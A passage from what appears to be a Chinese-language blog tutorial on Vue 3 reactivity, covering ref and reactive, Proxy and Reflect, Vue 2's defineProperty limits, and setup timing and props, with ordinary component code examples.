<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2&gt;姓名：&#123;&#123;name&#125;&#125;&lt;/h2&gt;</span><br><span class="line">&lt;h2&gt;年龄：&#123;&#123;age&#125;&#125;&lt;/h2&gt;</span><br></pre></td></tr></table></figure>

<p>插值语法中，不用写成<code>name.value</code>和<code>age.value</code>，<code>vue</code>在解析模板读取数据时，如果变量是一个<code>RefImpl</code>引用实现对象，则会自动读取其<code>value</code>的属性值</p>
<ul>
<li>读数据，会调用引用实现对象的原型对象的<code>getter</code></li>
</ul>
</li>
<li><p>写数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">import &#123;ref&#125; from &#x27;vue&#x27;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#x27;App&#x27;,</span><br><span class="line">  setup() &#123;</span><br><span class="line">    let name = ref(&#x27;sai&#x27;)</span><br><span class="line">    let age = ref(18)</span><br><span class="line"></span><br><span class="line">    function modifyInfo() &#123;</span><br><span class="line">      name.value = &#x27;sai_change&#x27;</span><br><span class="line">      age.value = 19</span><br><span class="line">      console.log(name, age)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return &#123;</span><br><span class="line">      name,</span><br><span class="line">      age,</span><br><span class="line">      modifyInfo</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>写数据，会调用引用实现对象的原型对象的<code>setter</code></p>
</li>
<li><p><code>setter</code>内部封装更新页面的逻辑</p>
</li>
<li><p>此时页面更新了</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220607094215557.png" alt="image-20220607094215557"></p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="8-3-2-2-ref函数处理对象数据类型"><a href="#8-3-2-2-ref函数处理对象数据类型" class="headerlink" title="8.3.2.2.ref函数处理对象数据类型"></a>8.3.2.2.<code>ref</code>函数处理对象数据类型</h4><p>先梳理一下<code>ref</code>函数处理基本数据类型的逻辑</p>
<ul>
<li>通过<code>ref</code>函数包裹基本数据类型，返回一个引用实现对象，可以通过<code>value</code>属性，取得包裹的数据的值</li>
<li>响应式实现方式，通过<code>Object.defineProperty</code>在其原型对象上定义<code>getter</code>和<code>setter</code></li>
</ul>
<p>按照类似的逻辑，<code>ref</code>函数处理对象类型的数据，也应该是这样的</p>
<ul>
<li><p>使用<code>ref</code>包裹对象类型的数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h1&gt;我是App组件&lt;/h1&gt;</span><br><span class="line">  &lt;h2&gt;姓名： &#123;&#123;person.name&#125;&#125;&lt;/h2&gt;</span><br><span class="line">  &lt;h2&gt;年龄： &#123;&#123;person.age&#125;&#125;&lt;/h2&gt;</span><br><span class="line">  &lt;button @click=&quot;modifyInfo&quot;&gt;修改信息&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import &#123;ref&#125; from &#x27;vue&#x27;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#x27;App&#x27;,</span><br><span class="line">  setup() &#123;</span><br><span class="line"></span><br><span class="line">    let person = ref(&#123;</span><br><span class="line">      name: &#x27;sai&#x27;,</span><br><span class="line">      age: 18</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    function modifyInfo() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return &#123;</span><br><span class="line">      person,</span><br><span class="line">      modifyInfo</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220607100950658.png" alt="image-20220607100950658"></p>
</li>
<li><p>根据<code>vue2</code>的经验，<code>vue3</code>应该会对对象的每个属性，都设置<code>getter</code>和<code>setter</code>，所以我们修改<code>age</code>属性时，应该是<code>person.value.age.value=19</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h1&gt;我是App组件&lt;/h1&gt;</span><br><span class="line">  &lt;h2&gt;姓名： &#123;&#123;person.name&#125;&#125;&lt;/h2&gt;</span><br><span class="line">  &lt;h2&gt;年龄： &#123;&#123;person.age&#125;&#125;&lt;/h2&gt;</span><br><span class="line">  &lt;button @click=&quot;modifyInfo&quot;&gt;修改信息&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import &#123;ref&#125; from &#x27;vue&#x27;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#x27;App&#x27;,</span><br><span class="line">  setup() &#123;</span><br><span class="line"></span><br><span class="line">    let person = ref(&#123;</span><br><span class="line">      name: &#x27;sai&#x27;,</span><br><span class="line">      age: 18</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    function modifyInfo() &#123;</span><br><span class="line">        // 修改数据</span><br><span class="line">        person.value.name.value = &#x27;sai_modify&#x27;</span><br><span class="line">        person.value.age.value = 19</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return &#123;</span><br><span class="line">      person,</span><br><span class="line">      modifyInfo</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>但是，此时修改不了</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220607101141197.png" alt="image-20220607101141197"></p>
</li>
<li><p>为啥咧</p>
<ul>
<li><p>打印下<code>person</code>引用实现对象，以及<code>value</code>属性</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">modifyInfo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 修改数据</span></span><br><span class="line">  <span class="comment">// person.value.name.value = &#x27;sai_modify&#x27;</span></span><br><span class="line">  <span class="comment">// person.value.age.value = 19</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(person)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(person.<span class="property">value</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220607101407849.png" alt="image-20220607101407849"></p>
</li>
<li><p>可以看到，<code>ref</code>函数处理对象数据类型，用的是<code>ES6</code>中的<code>Proxy</code>，关于<code>Proxy</code>下一小节详细讲解</p>
</li>
</ul>
</li>
</ul>
<h4 id="8-3-2-3-小结：ref函数"><a href="#8-3-2-3-小结：ref函数" class="headerlink" title="8.3.2.3.小结：ref函数"></a>8.3.2.3.小结：<code>ref</code>函数</h4><ul>
<li>作用：定义一个响应式的数据</li>
<li>语法：<code>const xxx = ref(initValue)</code><ul>
<li>创建一个包含响应式数据的引用对象（<code>reference</code>对象）</li>
<li><code>JS</code>中操作数据：<code>xxx.value</code></li>
<li>模板中读取数据，不需要<code>.value</code>，直接<code>&lt;div&gt;&#123;&#123;xxx&#125;&#125;&lt;/div&gt;</code></li>
</ul>
</li>
<li>备注：<ul>
<li>接收的数据可以是基本数据类型，也可以是对象数据类型</li>
<li>基本数据类型：响应式依然靠的是<code>Object.defineProperty</code>的<code>get</code>与<code>set</code></li>
<li>对象数据类型：内部<code>求助</code>了<code>Vue3</code>中的一个新函数——<code>reactive</code>函数</li>
</ul>
</li>
</ul>
<h3 id="8-3-3-reactive函数"><a href="#8-3-3-reactive函数" class="headerlink" title="8.3.3.reactive函数"></a>8.3.3.<code>reactive</code>函数</h3><p>将源对象交给<code>reactive</code>处理，返回的是一个代理对象</p>
<h4 id="8-3-3-1-返回的是Proxy对象"><a href="#8-3-3-1-返回的是Proxy对象" class="headerlink" title="8.3.3.1.返回的是Proxy对象"></a>8.3.3.1.返回的是<code>Proxy</code>对象</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h1&gt;我是App组件&lt;/h1&gt;</span><br><span class="line">  &lt;h2&gt;姓名： &#123;&#123;person.name&#125;&#125;&lt;/h2&gt;</span><br><span class="line">  &lt;h2&gt;年龄： &#123;&#123;person.age&#125;&#125;&lt;/h2&gt;</span><br><span class="line">  &lt;button @click=&quot;modifyInfo&quot;&gt;修改信息&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import &#123;reactive&#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#x27;App&#x27;,</span><br><span class="line">  setup() &#123;</span><br><span class="line">    let person = reactive(&#123;</span><br><span class="line">      name: &#x27;sai&#x27;,</span><br><span class="line">      age: 18</span><br><span class="line">    &#125;)</span><br><span class="line">    function modifyInfo() &#123;</span><br><span class="line">      console.log(person) // 这里不用.value，直接使用即可</span><br><span class="line">    &#125;</span><br><span class="line">    return &#123;</span><br><span class="line">      person,</span><br><span class="line">      modifyInfo</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220607110312006.png" alt="image-20220607110312006"></p>
<p>将源数据改成了<code>Proxy</code>类型的对象</p>
<h4 id="8-3-3-2-修改对象数据类型"><a href="#8-3-3-2-修改对象数据类型" class="headerlink" title="8.3.3.2.修改对象数据类型"></a>8.3.3.2.修改对象数据类型</h4><p>此时可以直接修改对象类型的数据了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h1&gt;我是App组件&lt;/h1&gt;</span><br><span class="line">  &lt;h2&gt;姓名： &#123;&#123;person.name&#125;&#125;&lt;/h2&gt;</span><br><span class="line">  &lt;h2&gt;年龄： &#123;&#123;person.age&#125;&#125;&lt;/h2&gt;</span><br><span class="line">  &lt;button @click=&quot;modifyInfo&quot;&gt;修改信息&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import &#123;reactive&#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#x27;App&#x27;,</span><br><span class="line">  setup() &#123;</span><br><span class="line">    let person = reactive(&#123;</span><br><span class="line">      name: &#x27;sai&#x27;,</span><br><span class="line">      age: 18</span><br><span class="line">    &#125;)</span><br><span class="line">    function modifyInfo() &#123;</span><br><span class="line">      // 修改数据</span><br><span class="line">      person.name = &#x27;sai_modify&#x27;</span><br><span class="line">      person.age = 19</span><br><span class="line">      console.log(person)</span><br><span class="line">    &#125;</span><br><span class="line">    return &#123;</span><br><span class="line">      person,</span><br><span class="line">      modifyInfo</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220607111003887.png" alt="image-20220607111003887"></p>
<h4 id="8-3-3-3-修改嵌套的对象数据"><a href="#8-3-3-3-修改嵌套的对象数据" class="headerlink" title="8.3.3.3.修改嵌套的对象数据"></a>8.3.3.3.修改嵌套的对象数据</h4><p>即使对象嵌套的很深，<code>reactive</code>函数也可以监测到其变化：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h1&gt;我是App组件&lt;/h1&gt;</span><br><span class="line">  &lt;h2&gt;姓名： &#123;&#123;person.name&#125;&#125;&lt;/h2&gt;</span><br><span class="line">  &lt;h2&gt;年龄： &#123;&#123;person.age&#125;&#125;&lt;/h2&gt;</span><br><span class="line">  &lt;h2&gt;测试数据： &#123;&#123;person.a.b.c&#125;&#125;&lt;/h2&gt;</span><br><span class="line">  &lt;button @click=&quot;modifyInfo&quot;&gt;修改信息&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import &#123;reactive&#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#x27;App&#x27;,</span><br><span class="line">  setup() &#123;</span><br><span class="line">    let person = reactive(&#123;</span><br><span class="line">      name: &#x27;sai&#x27;,</span><br><span class="line">      age: 18,</span><br><span class="line">      a: &#123;</span><br><span class="line">        b: &#123;</span><br><span class="line">          c: &#x27;test&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    function modifyInfo() &#123;</span><br><span class="line">      person.name = &#x27;sai_modify&#x27;</span><br><span class="line">      person.age = 19</span><br><span class="line">      person.a.b.c = &#x27;test_modify&#x27;</span><br><span class="line">      console.log(person)</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    return &#123;</span><br><span class="line">      person,</span><br><span class="line">      modifyInfo</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220607111533470.png" alt="image-20220607111533470"></p>
<h4 id="8-3-3-4-修改数组数据类型"><a href="#8-3-3-4-修改数组数据类型" class="headerlink" title="8.3.3.4.修改数组数据类型"></a>8.3.3.4.修改数组数据类型</h4><p>被<code>reactive</code>包裹的数组，可以直接通过索引来修改数组类型的数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h1&gt;我是App组件&lt;/h1&gt;</span><br><span class="line">  &lt;h2&gt;爱好：&#123;&#123;hobby&#125;&#125;&lt;/h2&gt;</span><br><span class="line">  &lt;button @click=&quot;modifyInfo&quot;&gt;修改信息&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    import &#123;reactive&#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">    export default &#123;</span><br><span class="line">        name: &#x27;App&#x27;,</span><br><span class="line">        setup() &#123;</span><br><span class="line">            let hobby = reactive([&#x27;eat&#x27;,&#x27;drink&#x27;])</span><br><span class="line"></span><br><span class="line">            function modifyInfo() &#123;</span><br><span class="line">                hobby[0] = &#x27;sleep&#x27;</span><br><span class="line">                console.log(hobby)</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            return &#123;</span><br><span class="line">                hobby,</span><br><span class="line">                modifyInfo</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>修改后的效果：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220617065538228.png" alt="image-20220617065538228"></p>
<h4 id="小结：reactive函数"><a href="#小结：reactive函数" class="headerlink" title="小结：reactive函数"></a>小结：<code>reactive</code>函数</h4><ul>
<li>作用：定义一个对象类型的响应式数据（基本数据类型不要用它，要用<code>ref</code>函数）</li>
<li>语法：<code>const 代理对象 =  reactive(源对象)</code>，接收一个对象（或数组），返回一个代理对象（<code>Proxy</code>的实例对象，简称<code>Proxy</code>对象）</li>
<li><code>reactive</code>定义的响应式数据是<code>深层次的</code></li>
<li>内部基于<code>ES6</code>的<code>Proxy</code>实现，通过代理对象操作源对象的内部数据</li>
</ul>
<h3 id="8-3-4-Vue3中的响应式原理"><a href="#8-3-4-Vue3中的响应式原理" class="headerlink" title="8.3.4.Vue3中的响应式原理"></a>8.3.4.<code>Vue3</code>中的响应式原理</h3><h4 id="8-3-4-1-Vue2的响应式"><a href="#8-3-4-1-Vue2的响应式" class="headerlink" title="8.3.4.1.Vue2的响应式"></a>8.3.4.1.<code>Vue2</code>的响应式</h4><ul>
<li><p>实现原理：</p>
<ul>
<li><p>对象类型：通过<code>Object.defineProperty()</code>对属性的读取、修改进行拦截（数据劫持）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(data, <span class="string">&#x27;count&#x27;</span>, &#123;</span><br><span class="line">  <span class="title function_">get</span>(<span class="params"></span>) &#123;&#125;,</span><br><span class="line">  <span class="title function_">set</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>数组类型：通过重写更新数组的一系列方法来进行拦截。（对数组的变更方法进行了包裹）</p>
</li>
</ul>
</li>
<li><p>存在问题：</p>
<ul>
<li><p>对象类型：新增属性、删除属性，界面不会更新</p>
<ul>
<li><p>新增的属性，要通过<code>this.$set</code>或<code>Vue.set</code>才会变成响应式的</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.$set(<span class="variable language_">this</span>.<span class="property">person</span>, <span class="string">&#x27;sex&#x27;</span>, <span class="string">&#x27;女&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>删除的属性，要通过<code>this.$delete</code>或<code>Vue.delete</code>才会变成响应式的</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.$delete(<span class="variable language_">this</span>.<span class="property">person</span>, <span class="string">&#x27;name&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>数组类型：直接通过下标修改数组，界面不会自动更新</p>
<ul>
<li><p>要通过<code>this.$set</code>或<code>Vue.set</code>才会变成响应式的</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.$set(<span class="variable language_">this</span>.<span class="property">person</span>.<span class="property">hobby</span>, <span class="number">0</span>, <span class="string">&#x27;逛街&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>或者调用<code>splice</code>方法</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">person</span>.<span class="property">hobby</span>.<span class="title function_">splice</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="string">&#x27;逛街&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="8-3-4-2-Vue3的响应式"><a href="#8-3-4-2-Vue3的响应式" class="headerlink" title="8.3.4.2.Vue3的响应式"></a>8.3.4.2.<code>Vue3</code>的响应式</h4><ul>
<li>实现原理：<ul>
<li>通过<code>Proxy</code>（代理）：拦截对象中任意属性的变化，包括：属性值的读写、属性的添加、删除等</li>
<li>通过<code>Reflect</code>（反射）：对被代理对象的属性进行操作</li>
<li><code>MDN</code>文档中描述的<code>Proxy</code>和<code>Reflect</code><ul>
<li><code>Proxy</code>：<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy</a></li>
<li><code>Refelct</code>：<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect</a></li>
</ul>
</li>
</ul>
</li>
<li>验证对象的操作</li>
<li>验证数组的操作</li>
<li>模拟<code>Vue2</code>的响应式</li>
<li>模拟<code>Vue3</code>的响应式<ul>
<li>验证<code>Proxy</code>基本语法<ul>
<li>读取：<code>get</code></li>
<li>修改和新增：<code>set</code></li>
<li>删除：<code>deleteProperty</code></li>
</ul>
</li>
<li>验证<code>Reflect</code>基本语法<ul>
<li>获取属性值</li>
<li>修改属性值</li>
<li>删除属性</li>
<li><code>ECMA</code>正在尝试把<code>Object</code>上的方法，移植到<code>Reflect</code>身上<ul>
<li><code>Obeject.defineProperty</code><ul>
<li>基本使用</li>
<li>一旦有异常就会挂掉，除非用<code>try catch</code>捕获到</li>
</ul>
</li>
<li><code>Reflect.defineProperty</code><ul>
<li>j基本使用</li>
<li>会有布尔类型的返回值，异常处理比较方便</li>
<li>对于框架封装来说，使用<code>Reflect</code>相对会好一点</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>使用<code>Reflect</code>配合<code>Proxy</code></li>
</ul>
</li>
</ul>
<h3 id="8-3-5-reactive对比ref"><a href="#8-3-5-reactive对比ref" class="headerlink" title="8.3.5.reactive对比ref"></a>8.3.5.<code>reactive</code>对比<code>ref</code></h3><ul>
<li>从定义数据角度对比<ul>
<li><code>ref</code>用来定义：基本数据类型</li>
<li><code>reactive</code>用来定义：对象（或数组）类型数据</li>
<li>备注：<code>ref</code>也可以用来定义对象（或数组）类型数据，它内部会自动通过<code>reactive</code>转为代理对象</li>
</ul>
</li>
<li>从原理角度对比<ul>
<li><code>ref</code>通过<code>Object.defineProperty()</code>的<code>get</code>与<code>set</code>来实现响应式（数据劫持）</li>
<li><code>reactive</code>通过使用<code>Proxy</code>来实现响应式（数据劫持），并通过<code>Reflect</code>操作源对象内部的数据</li>
</ul>
</li>
<li>从使用角度对比<ul>
<li><code>ref</code>定义的数据：操作数据需要<code>.value</code>，读取数据时模板中直接读取不需要<code>.value</code></li>
</ul>
</li>
</ul>
<h3 id="8-3-6-setup的两个注意点"><a href="#8-3-6-setup的两个注意点" class="headerlink" title="8.3.6.setup的两个注意点"></a>8.3.6.<code>setup</code>的两个注意点</h3><h4 id="8-3-6-1-setup执行的时机"><a href="#8-3-6-1-setup执行的时机" class="headerlink" title="8.3.6.1.setup执行的时机"></a>8.3.6.1.<code>setup</code>执行的时机</h4><ul>
<li>在<code>beforeCreate</code>之前执行一次，<code>this</code>是<code>undefined</code></li>
</ul>
<h4 id="8-3-6-2-setup的参数"><a href="#8-3-6-2-setup的参数" class="headerlink" title="8.3.6.2.setup的参数"></a>8.3.6.2.<code>setup</code>的参数</h4><h5 id="参数验证"><a href="#参数验证" class="headerlink" title="参数验证"></a>参数验证</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">set</span>(<span class="params">a, b, c</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(a, b, c)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>图片</p>
<h5 id="props参数"><a href="#props参数" class="headerlink" title="props参数"></a><code>props</code>参数</h5><p>值为对象，包含：组件外部传递过来，且在组件内部声明接收了的属性</p>
<ul>
<li><p><code>vue2</code>中的<code>props</code></p>
<ul>
<li><p>如果使用<code>props</code>接收了，传的数据挂载在<code>vc</code>实例上</p>
</li>
<li><p>如果没有使用<code>props</code>接收，传的数据挂载在<code>$attrs</code>上</p>
</li>
</ul>
</li>
<li><p><code>vue3</code>中的<code>props</code></p>
<p><code>App.vue</code></p>
